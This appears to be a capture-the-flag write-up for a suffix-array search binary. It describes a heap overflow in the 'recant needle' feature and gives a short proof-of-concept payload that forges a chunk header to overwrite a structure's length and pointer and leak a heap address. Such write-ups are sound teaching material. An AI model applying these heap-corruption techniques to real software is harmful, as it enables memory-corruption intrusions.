# Overview

The binary is an implementation of a suffix array to efficiently search for needles in large haystack strings. I expected a logical bug in the algorithmic part, but my teammate informed me about a very easy yet powerful bug so I just used it instead. I think it's probably unintentional...

# The bug

The bug is triggered when the needle is longer than the haystack in the `recant needle` feature. By using the proof of concept below we can easily get a heap overflow.

```
payload = p64(0)*2 #our data
payload += p64(0)+p64(0x31) #next heap header
payload += p64(0x100)+chr(0)


add ("A"*0x10)
add ('')
add (payload)
delete(1)

recant (2, payload+"\x00")
```

We can overwrite the haystack structure of index 2, so I changed the length to a long value and its `buf` pointer's least significant byte so that it leaks a heap pointer.

Afterwards getting a LIBC leak and getting arbitrary write is super easy in tcache malloc so i'll just skip that part. 

# Unintentional Solution?

I looked at other teams' writeups and found out they used a much complex exploit primitive and used a ptmalloc exploit technique to get arbitrary write. Based on the scoring (500 point for a heap overflow challenge?) and other people's opinions I concluded that this bug is most likely unintentional.
